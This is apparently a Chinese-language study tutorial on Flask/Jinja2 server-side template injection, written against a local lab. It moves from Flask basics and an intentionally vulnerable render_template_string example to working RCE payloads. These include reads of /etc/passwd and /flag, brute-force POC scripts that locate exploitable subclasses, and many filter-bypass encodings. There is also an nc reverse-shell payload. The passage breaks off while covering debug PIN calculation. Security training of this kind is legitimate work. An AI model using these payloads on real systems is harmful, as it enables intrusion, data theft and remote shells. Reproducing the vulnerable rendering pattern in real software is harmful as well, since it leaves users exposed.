┌──(root㉿pinginglab)-[/opt/flask1]
└─# python3 demo.py

# 退出虚拟环境
┌──(root㉿pinginglab)-[/opt/flask1]
└─# deactive
```

### 4. 安装flask

==注意：是在虚拟环境中安装==

```bash
┌──(root㉿pinginglab)-[/opt/flask1]
└─# source ./bin/activate
                         
┌──(flask1)─(root㉿pinginglab)-[/opt/flask1]
└─# python3         
Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import flask
```

## 0x02 Python flask 应用介绍及搭建

Flask 是一个使用 Python 编写的轻量级Web应用框架

Python可直接用flask启动一个web服务器页面

类似于PHP Think

### 1. Flask 基本架构

```py
┌──(flask1)─(root㉿pinginglab)-[/opt/flask1/resource]
└─# vim demo.py 

from flask import Flask
# 创建Flask实例，告诉 Flask 应用程序在哪里找到模板和静态文件等资源。
app = Flask(__name__)

# 指定路由为网站根目录
@app.route('/')
def hello():
    return "hello benben"

if __name__=='__main__':
    app.run(debug=True,host="0.0.0.0")
```

## 0x03 Python flask 变量及方法

### 1. Flask 变量规则

通过向规则参数添加变量部分，可以动态构建URL

```py
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello():
    return "hello benben"

# 在URL中使用 <> 格式获取变量
@app.route('/hello/<name>')
def hello1(name):
    return "hello %s" %name

if __name__=='__main__':
    app.run(debug=True,host="0.0.0.0")
```

### 2. HTTP 方法

| 方法   | 描述                                                         |
| ------ | ------------------------------------------------------------ |
| GET    | 以未加密的形式通过URL将数据发送到服务器                      |
| HEAD   | 和GET方法相同，但没有响应体                                  |
| POST   | 用于将HTML表单数据发送到服务器。POST方法接收的数据不由服务器缓存 |
| PUT    | 用上传的内容替换目标资源的所有当前表示                       |
| DELETE | 删除由URL给出的目标资源的所有当前表示                        |

### 3. 小小案例

通过前端HTML页面来传递用户数据，并返回到flak进行处理

**index.html**

```html
<html>
<head></head>
<body>
<!-- 用户提交信息后，跳转到 /login 页面处理 -->
<form action="http://127.0.0.1:5000/login" method="post">
    <p>Enter Your Username</p>
    <input type="text" name="ben">
    <input type="submit" name="btn" value="ben">
</form>
</body>
<footer></footer>
</html>
```

**app.py**

```py
from flask import Flask, redirect, url_for, request, render_template

app = Flask(__name__)

# 用户访问 / ，直接重定向到 index.html
@app.route('/')
def index():
    return render_template("index.html")


@app.route('/success/<name>')
def success(name):
    return f"welcome {name}"

# 接收两种方法来传参
@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        print(1)
        # 获取变量名为 ben 的值，相当于 $_POST['ben']
        user = request.form['ben']
        # 重定向到 /success，并将 user 当作参数一起传过去
        return redirect(url_for('success', name=user))
    else:
        print(2)
        user = request.args.get('ben')
        return redirect(url_for('success', name=user))


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

## 0x04 Python flask 模板介绍

### 1. Flask模板

**视图函数**的主要作用是生成请求的响应

**视图函数**只负责业务逻辑和数据处理

**模板**取到视图函数的数据结果来进行展示

使用模板：使用静态的页面HTML展示动态内容，达到前后端分离

### 2. render_template

#### 方法一：（标准）

Flask 传递模板变量

**app.py**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    my_name = flask.request.args.get('name')
    my_age = 18
    return flask.render_template("index.html", my_name=my_name, my_age=my_age)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

**index.html**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<p>index 页面</p>
<!--{{变量名}} === 占位符-->
<p>姓名：{{my_name}}</p>
<p>年龄：{{my_age}}</p>
</body>
</html>
```

#### 方法二：

直接在当前页面渲染，并没有做到前后端分离

**app.py**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    my_name = flask.request.args.get('name')
    my_age = 18
    # 直接在当前页面渲染
    return flask.render_template_string(f"<p>姓名：{my_name}</p><p>年龄：{my_age}</p>")


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

## 0x05 模板注入原理介绍

SSTI：可能造成任意文件读取和RCE远程控台后台系统

漏洞成因：

+ 渲染模板时，没有严格控制对用户的输入
+ 使用了危险的模板，导致用户可以和flask程序进行交互

flask 时基于 Python 开发的一种web服务器，那么也就意味着可以和flask进行交互的话，就可以执行python代码，比如eval、system、file等等之类的函数

### 1. 无漏洞代码

这段代码中的所有变量，都是返回到前端后，依据占位符逐个填入

**变量的渲染是在前端完成**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    my_name = flask.request.args.get('name')
    my_age = 18
    html_code = """
    <html>
    <body>
    <p>姓名：{{my_name}}</p>
    <p>年龄：{{my_age}}</p>
    <p>Success</p>
    </body>
    </html>
    """
    return flask.render_template_string(html_code, my_name=my_name, my_age=my_age)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

### 2. 漏洞代码

这段代码中，变量的传递是在后端完成的，并且没有使用占位符直接传入；以此，可执行RCE攻击

**变量的渲染是在后端完成**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    my_name = flask.request.args.get('name')
    my_age = 18
    return flask.render_template_string(f"<p>姓名：{my_name}</p><p>年龄：{my_age}</p>")


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

两个原因以至于造成SSTI漏洞：

1. 变量没有做任何的安全过滤
2. 变量是在后台直接写入HTML代码中，再返回前端渲染

```
payload：?name={{7*7}}
```

![image-20230824223855958](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824223855958.png)

### 3. 模板注入漏洞探测图

==绿色：执行成功；红色：执行失败==

![image-20230824224017565](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824224017565.png)

## 0x06 Python 继承关系和魔术方法

### 1. 继承关系

继承关系是python三态之一

为了降低代码的冗余度，子类可以继承父类的代码，也可以继承之后进行修改（重构）

==object是所有父子关系的顶端，所有的数据类型最终的父类都是object==

### 2. 继承关系

```py
class A:pass
class B(A):pass
class C(B):pass
class D(C):pass

c = C()
print(c.__class__)      # 输出：<class '__main__.C'>；输出当前类
print(c.__class__.__base__)     # 输出：<class '__main__.B'>；输出父类
print(c.__class__.__mro__)     # 输出：(<class '__main__.C'>, <class '__main__.B'>, <class '__main__.A'>, <class 'object'>)； 输出所有父类（向上搜索）
print(c.__class__.__base__.__base__.__subclasses__())       # 输出：[<class '__main__.B'>]；输出所有子类
```

### 3. 魔术方法

`__class__`：查找当前类型的所属对象

`__base__`：沿着父子类的关系向上查询一个

`__mro__`：查找当前类对象的所有继承类

`__subclasses__()`：查找父类下的所有子类



`__init__`：查找类是否重载（被加载），重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现**wrapper**字眼，说明没有被重载

`__globals__`：函数会以字典的形式返回当前对象的全部全局变量

`__builtins__`：提供对Python的所有“内置”标识符的直接访问（人话：Python在启动时会将一些常用函数提前加载到该模块中，以便后续使用）

### 4. 检查漏洞

常用注入模块

![image-20230824233914202](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824233914202.png)

### 5. 无过滤注入

#### 1. 测试是否存在漏洞

7*7被计算

```
payload：{{7*7}}
```

![image-20230824234215411](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234215411.png)

#### 2. 寻找可利用方法

```bash
# 先直接通过 str 来获取父类 object
{{''.__class__.__base__}}
```

![image-20230824234357483](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234357483.png)

```bash
# 通过 __subclasses__() 来查询所有子类，
{{''.__class__.__base__.__subclasses__()}}
```

![image-20230824234544922](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234544922.png)

```bash
# 尝试利用 <class 'os._wrap_close'> 来做RCE攻击
{{''.__class__.__base__.__subclasses__()[117]}}
```

![image-20230824234655589](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234655589.png)

```bash
# 查询 <class 'os._wrap_close'> 是否已被加载，下面回显可看出 <class 'os._wrap_close'> 的内存地址，证明已被加载，并使用 __init__ 访问子类
{{''.__class__.__base__.__subclasses__()[117].__init__}}
```

![image-20230824234748909](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234748909.png)

```bash
# 查询 <class 'os._wrap_close'> 下的可利用函数；__globals__ 会以字典的方式返回
{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__}}
```

![image-20230824235042278](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824235042278.png)

```bash
# 最后选择 popen 函数做RCE攻击
{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']}}
```

#### 3. 执行攻击

```bash
# 最后payload：
# 由于 popen 会返回一个文件对象，所以最后使用 read() 方法读取
{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']("cat /etc/passwd").read()}}
```

![image-20230825000045513](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825000045513.png)

## 0x07 SSTI常用注入模块利用（上）

### 1. 文件读取

**查找子类：` <class '_frozen_importlib_external.FileLoader'>`**

#### POC 代码

```py
import requests


def post():
    for i in range(400):
        payload = {'code': "{{''.__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        try:
            req = requests.post(base_url, data=payload)
            if target_class in req.text:
                print("可利用函数索引：", i)
                break
        except Exception as e:
            print("出现错误：", e)


def get():
    for j in range(400):
        payload = "?code={{''.__class__.__base__.__subclasses__()[" + str(j) + "]}}"
        try:
            req = requests.get(base_url + payload)
            if target_class in req.text:
                print("可利用函数索引：", j)
                break
        except Exception as e:
            print("出现错误：", e)


if __name__ == '__main__':
    base_url = "http://192.168.231.129:18080/flasklab/level/1"
    target_class = "frozen_importlib_external.FileLoader"
    post()
```

#### 解题流程

```
payload：code={{''.__class__.__base__.__subclasses__()[79]['get_data'](0,"/etc/passwd")}}
```

![image-20230825174825040](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825174825040.png)

### 2. 内建函数命令执行（eval）

#### 查找eval函数POC代码

```py
import requests

base_url = 'http://192.168.231.129:18080/flasklab/level/1'
target_function = "eval"

for i in range(500):
    payload = "{{''.__class__.__base__.__subclasses__()[" + str(i) + "].__init__.__globals__['__builtins__']}}"
    data = {"code": payload}
    try:
        res = requests.post(base_url, data=data)
        # print(res.text)
        if target_function in res.text:
            print(i)
    except Exception as e:
        print(e)
```

#### 解题流程

```
payload：code={{''.__class__.__base__.__subclasses__()["244"].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat+/etc/passwd").read()')}}
```

![image-20230825175423262](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825175423262.png)

### 3. 内建函数命令执行（system）

==函数`system`与`popen`都在`os`模块中，关键字为：`sys`==

#### `system`函数查找POC代码

```py
import requests

base_url = 'http://192.168.231.129:18080/flasklab/level/1'
target_function = "sys"

for i in range(500):
    payload = "{{''.__class__.__base__.__subclasses__()[" + str(i) + "].__init__.__globals__}}"
    data = {"code": payload}
    try:
        res = requests.post(base_url, data=data)
        # print(res.text)
        if target_function in res.text:
            print("可利用索引：", i)
    except Exception as e:
        print(e)

```

#### 解题流程

经过测试，SSTI攻击中使用`system`函数并没有回显，但是可以使用nc回弹webshell

```
payload：
{{[].__class__.__mro__[1].__subclasses__()[168].__init__.__globals__['sys'].modules['os'].system('nc 192.168.231.129 7777 -e /bin/bash')}}
```

## 0x08 SSTI常用注入模块利用（下）

### 1.  查看flask内建函数或模块

```
payload：
{{self.__dict__._TemplateReference__context.keys()}}
```

![image-20230825230408228](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825230408228.png)

我们可以直接利用内置模块来调用要利用的函数

```
payload：{{lipsum.__globals__['os'].popen("id").read()}}
```

![image-20230825230759705](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825230759705.png)

### 2. importlib类执行命令

==关键字，类名：`_frozen_importlib.BuiltinImporter`==

#### importlib类搜索POC代码

```py
import requests


def post():
    for i in range(400):
        payload = {'code': "{{''.__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        try:
            req = requests.post(base_url, data=payload)
            if target_class in req.text:
                print("可利用函数索引：", i)
                break
        except Exception as e:
            print("出现错误：", e)

if __name__ == '__main__':
    base_url = "http://192.168.231.129:18080/flasklab/level/1"
    target_class = "_frozen_importlib.BuiltinImporter"
    post()

```

#### 解题流程

通过子模块`importlib`加载`os`类，以执行命令`popen 或 system`

```
payload：
{{''.__class__.__base__.__subclasses__()[69]['load_module']('os')['popen']('id').read()}}
```

![image-20230825231722858](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825231722858.png)

### 3. linecache函数执行命令

`linecache`函数可用于读取任意一个文件的某一行，而这个函数中引入了os模块，所以我们也可以利用这个 linecache 函数去执行命令

#### linechache函数搜索POC代码

==关键字，函数名：`linecache`==

```py
import requests

base_url = 'http://192.168.231.129:18080/flasklab/level/1'
target_function = "linecache"

for i in range(500):
    payload = "{{''.__class__.__base__.__subclasses__()[" + str(i) + "].__init__.__globals__}}"
    data = {"code": payload}
    try:
        res = requests.post(base_url, data=data)
        # print(res.text)
        if target_function in res.text:
            print("可利用索引：", i)
    except Exception as e:
        print(e)

```

#### 解题流程

```
payload：
{{''.__class__.__base__.__subclasses__()[268].__init__.__globals__['os'].popen("id").read()}}
```

![image-20230825232332793](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825232332793.png)

### 4. `subprocess.Popen`类执行命令

从python2.4版本开始，可以用subprocess这个模块来产生子进程，并链接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值

subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen等

#### subprocess，Popen类搜索POC代码

==关键字，类名：`subprocess.Popen`==

```py
import requests


def post():
    for i in range(400):
        payload = {'code': "{{''.__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        try:
            req = requests.post(base_url, data=payload)
            if target_class in req.text:
                print("可利用函数索引：", i)
                break
        except Exception as e:
            print("出现错误：", e)


def get():
    for j in range(400):
        payload = "?code={{''.__class__.__base__.__subclasses__()[" + str(j) + "]}}"
        try:
            req = requests.get(base_url + payload)
            if target_class in req.text:
                print("可利用函数索引：", j)
                break
        except Exception as e:
            print("出现错误：", e)


if __name__ == '__main__':
    base_url = "http://192.168.231.129:18080/flasklab/level/1"
    target_class = "subprocess.Popen"
    post()

```

#### 解题流程

```
payload：
{{''.__class__.__base__.__subclasses__()[200]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

![image-20230825233530973](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825233530973.png)

### 5. OS模块搜索

OS模块可以使用：`system、OS、popen`等函数，所以只要能定位OS模块，成功概率就能大幅提升

==OS模块关键字：`os._wrap_close`==

```py
import requests


def post():
    for i in range(400):
        payload = {'code': "{{''.__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        try:
            req = requests.post(base_url, data=payload)
            if target_class in req.text:
                print("可利用函数索引：", i)
                break
        except Exception as e:
            print("出现错误：", e)

if __name__ == '__main__':
    base_url = "http://192.168.231.129:18080/flasklab/level/1"
    target_class = "os._wrap_close"
    post()

```





## 0x09 绕过过滤双大括号

### 1. 前置知识

#### flask模板循环

**app.py**

直接将列表传给模板

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    girls = ['安其拉', '王昭君', '艾琳', '艾希', '李元芳']
    return flask.render_template("index.html", girls=girls)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

**index.html**

注意记住格式照套就行

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<p>index 页面</p>
<ul>
    {% for girl in girls%}
    	<li>{{ girl }}</li>
    {% endfor %}
</ul>
</body>
</html>
```

#### flask模板if判断

**app.py**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    girls = ['安其拉', '王昭君', '艾琳', '艾希', '李元芳']
    return flask.render_template("index.html", girls=girls)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

**index.html**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .a{
            color: red;
            font-weight:bold;
        }
    </style>
</head>
<body>
<p>index 页面</p>
<ul>
    {% for girl in girls%}
        {% if girl|length >= 3 %}
            <li class="a">{{ girl }}</li>
        {% else %}
            <li>{{ girl }}</li>
        {% endif %}
    {% endfor %}
</ul>
</body>
</html>
```

#### flask模板变量

![image-20230902184656320](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902184656320.png)

### 2. 绕过思路

![image-20230902184904928](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902184904928.png)

**索引搜索POC代码**

```py
import requests

base_url = 'http://192.168.231.129:18080/flasklab/level/2'
target_function = "popen"

for i in range(500):
    payload = "{% if ''.__class__.__base__.__subclasses__()[" + str(i) +"].__init__.__globals__['popen']('cat /etc/passwd').read()%}benben{%endif%}"
    data = {"code": payload}
    try:
        res = requests.post(base_url, data=data)
        # print(res.text)
        if 'benben' in res.text:
            print("可利用索引：{}；\npayload：{}".format(i, payload))
    except Exception as e:
        print(e)

```

### 3. 解题流程

#### a. 搜索索引值

运行POC代码得到的结果：

```
可利用索引：117；
payload：{% if ''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()%}benben{%endif%}
```

可知到索引值为117

#### b. 输出结果

![image-20230902185046050](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185046050.png)

![image-20230902185228558](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185228558.png)

![image-20230827203210371](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230827203210371.png)

## 0x10 getitem绕过中括号过滤

### 1. `__getitem__`魔术方法

**对字典使用时，传入字符串，返回字典响应键所对应的值**

对列表使用时，传入整数返回列表索引值

```py
dict1 = {
    '1': 'a',
    '2': 'b',
    '3': 'c'
}

print(dict1.__getitem__('1'))		# 等于：dict['1']

# 输出
b
```

### 2. 解题流程

将中括号的地方改成使用`__getitem__`即可

```
payload：code={{''.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__('popen')('cat /flag').read()}} 
```

![image-20230827233510691](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230827233510691.png)

## 0x11 request 绕过单双引号过滤

> 这里的 request 并非python中的 requests 模块，而是flask中的 request

### 1. 前置知识

![image-20230828134401918](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828134401918.png)

#### GET | POST | Cookie 传参

**app.py**

```
import flask

app = flask.Flask(__name__)


@app.route("/", methods=['POST', 'GET'])
def index():
    return flask.render_template("index.html")


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")
```

**index.html**

```py
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .a{
            color: red;
            font-weight:bold;
        }
    </style>
</head>
<body>
<p>index 页面</p>
<p>GET 传参：{{ request.args.k1 }}</p>
<p>POST 传参：{{ request.form.k1 }}</p>
<p>Cookie 传参：{{ request.cookies.k1}}</p>
</body>
</html>
```

### 2. 绕过实战

因为不能使用单双引号，所以在返回字典时，无法使用直接 键（str）来获取值，此时可以使用：`xxx.__globals__[request.args.k1]`

#### GET 传参绕过

```
payload：
code={{[].__class__.__base__.__subclasses__()[117].__init__.__globals__[request.args.popen](request.args.cmd).read()}}

GET 传参：
popen=popen&cmd=cat /flag
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828135357227.png" alt="image-20230828135357227" style="zoom:67%;" />

#### POST传参

```
payload：
code={{[].__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.popen](request.form.cmd).read()}}&popen=popen&cmd=cat /flag
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828135455299.png" alt="image-20230828135455299" style="zoom:67%;" />

#### Cookie 传参

```
payload：
code={{[].__class__.__base__.__subclasses__()[117].__init__.__globals__[request.cookies.popen](request.cookies.cmd).read()}}

Cookie 传参：
popen=popen;cmd=cat /flag
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828135611577.png" alt="image-20230828135611577" style="zoom:67%;" />

## 0x12 过滤器过下划线绕过

### 1. 前置知识

#### flask常用过滤器

```
length() # 获取一个序列或者字典的长度并将其返回
int()：# 将值转换为int类型；
float()：# 将值转换为float类型；
lower()：# 将字符串转换为小写；
upper()：# 将字符串转换为大写；
reverse()：# 反转字符串；
replace(value,old,new)： # 将value中的old替换为new
list()：# 将变量转换为列表类型；
string()：# 将变量转换成字符串类型；
join()：# 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用
attr(): # 获取对象的属性
```

#### 简单使用

**app.py**

```py
import flask

app = flask.Flask(__name__)


@app.route("/", methods=['POST', 'GET'])
def index():
    girls = ['安其拉', '王昭君', '艾琳', '艾希', '李元芳']
    user = "woyaodaxie"
    return flask.render_template("index.html", girls=girls, user=user)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

**index.html**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .a{
            color: red;
            font-weight:bold;
        }
    </style>
</head>
<body>
<p>index 页面</p>
<p>列表长度：{{ girls|length }}</p>
{{girls.append("卡特琳娜")}}
<p>列表长度：{{ girls|length }}</p>
<p>{{ user|upper}}</p>
    
<p>{{''|attr('__class__')}}</p>
</body>
</html>
```

![image-20230828143442358](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828143442358.png)



### 2. 绕过实战

#### `attr()`绕过下划线

```
payload：
code={{''|attr(request.args.cls)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.geti)(117)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)('popen')('cat /flag')|attr('read')()}}

GET 传参：
cls=__class__&bas=__base__&sub=__subclasses__&geti=__getitem__&ini=__init__&glo=__globals__
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828144840762.png" alt="image-20230828144840762" style="zoom:67%;" />

#### Unicode编码绕过

```
payload：
code={{''|attr("\u005F\u005F\u0063\u006C\u0061\u0073\u0073\u005F\u005F")|attr("\u005F\u005F\u0062\u0061\u0073\u0065\u005F\u005F")|attr("\u005F\u005F\u0073\u0075\u0062\u0063\u006C\u0061\u0073\u0073\u0065\u0073\u005F\u005F")()|attr("\u005F\u005F\u0067\u0065\u0074\u0069\u0074\u0065\u006D\u005F\u005F")(117)|attr("\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F")|attr("\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F")|attr("\u005F\u005F\u0067\u0065\u0074\u0069\u0074\u0065\u006D\u005F\u005F")("popen")("cat /flag")|attr('read')()}}

payload 原型：
{{''|attr('__class__')|attr(__base__)|attr(__subclasses__)()|attr(__getitem__)(117)|attr(__init__)|attr(__globals__)|attr(__getitem__)('popen')('cat /flag')|attr('read')()}}
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828145528225.png" alt="image-20230828145528225" style="zoom:67%;" />

#### 16位编码

```
payload：
code={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[199]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"].popen("ls").read()}}
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828150207220.png" alt="image-20230828150207220" style="zoom:67%;" />

## 0x13 中括号绕过点过滤

### 1. attr绕过

使用 attr 也不会出现`.`

```
payload:
code={{''|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(117)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('cat /flag')|attr('read')()}}
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828151159447.png" alt="image-20230828151159447" style="zoom:67%;" />

### 2. 中括号绕过

python 语法中除了可以使用`.`来访问对象属性外，还可以使用`[]`来访问

```
payload：
code={{''['__class__']['__base__']['__subclasses__']()[117]['__init__']['__globals__']['popen']('cat /flag')['read']()}}
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828152128112.png" alt="image-20230828152128112" style="zoom:67%;" />

## 0x13 饶过关键字过滤

### 1. 编码绕过

使用 Unicode、16位编码等方式绕过

```
payload：
{{''|attr("\u005F\u005F\u0063\u006C\u0061\u0073\u0073\u005F\u005F")|attr("\u005F\u005F\u0062\u0061\u0073\u0065\u005F\u005F")|attr("\u005F\u005F\u0073\u0075\u0062\u0063\u006C\u0061\u0073\u0073\u0065\u0073\u005F\u005F")()|attr("\u005F\u005F\u0067\u0065\u0074\u0069\u0074\u0065\u006D\u005F\u005F")(117)|attr("\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F")|attr("\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F")|attr("\u005F\u005F\u0067\u0065\u0074\u0069\u0074\u0065\u006D\u005F\u005F")("popen")("cat /flag")|attr('read')()}}

payload 原型：
{{''|attr('__class__')|attr(__base__)|attr(__subclasses__)()|attr(__getitem__)(117)|attr(__init__)|attr(__globals__)|attr(__getitem__)('popen')('cat /flag')|attr('read')()}}
```



```
payload:
payload：
code={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[199]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"].popen("ls").read()}}
```

### 2. 字符串拼接

用`+`连接字符串：`'__cl'+'ass__'`

```
payload：
code={{''['__cl'+'ass__']['__bas'+'e__']['__subcla'+'sses__']()[117]['__ini'+'t__']['__glob'+'als__']['po'+'pen']('cat /flag').read()}}
```

### 3. `~`拼接

![image-20230902185357324](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185357324.png)

![image-20230902185520544](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185520544.png)

### 4. 使用过滤器（reverse反转、replace替换、join拼接等）

#### reverse反转

![image-20230902185533548](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185533548.png)

#### replace替换

![image-20230902185542117](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185542117.png)

![image-20230828203905003](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828203905003.png)

#### join拼接

![image-20230902185555482](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185555482.png)

![image-20230828204025438](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828204025438.png)

## 0x14 `length`过滤器绕过数字过滤

### 1. 前置知识

以操作符来分割

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<p>数量：{{'aaaaaaaaaaaa'|length*'aaaaaaaaaa'|length-'aaa'|length}}</p>
</body>
</html>

<!--输出：117-->
```

### 2. 绕过实战

先定义一个变量来存储数字

![image-20230902185609618](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185609618.png)

![image-20230828205237772](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828205237772.png)

## 0x15 获取config文件

这个先记住可通过这两条payload来获取config文件的内容就好

```
payload:
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
```

## 0x16 混合过滤一

```
目标WAF: bl[’’’, ‘"’, ‘+’, ‘request’, ‘.’, ‘[’, ‘]’]
```

### 1. 前置知识

注意通过 list 过滤器将对象转换为列表

![image-20230902185629649](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185629649.png)

**组装语句：`cat flag`**

![image-20230902185705408](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185705408.png)

### 2. 绕过实战

使用 join 提取变量名

![image-20230902185712877](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185712877.png)

![image-20230829152817366](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230829152817366.png)

## 0x17 混合过滤二

![image-20230829172702086](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230829172702086.png)

## 0x18 Python debug ping 码计算

ping 码主要由六个参数构成：

```
1. username
    通过getpass.getuser()读取
    通过文件/etc/passwd 或 /proc/self/environ 中找到用户名
    执行代码读取文件：
    {% for c in [].__class__.__base__.__subclasses__() %}
    {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read() }}
    {% endif %}
    {% endfor %}
    或:
    {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']          ('/etc/passwd').read()}}
2. modname
通过getattr(mod,"file",None)读取，默认值为flask.app
3. appname
通过getattr(app,"name",type(app).name)读取，默认值为Flask
4. moddir
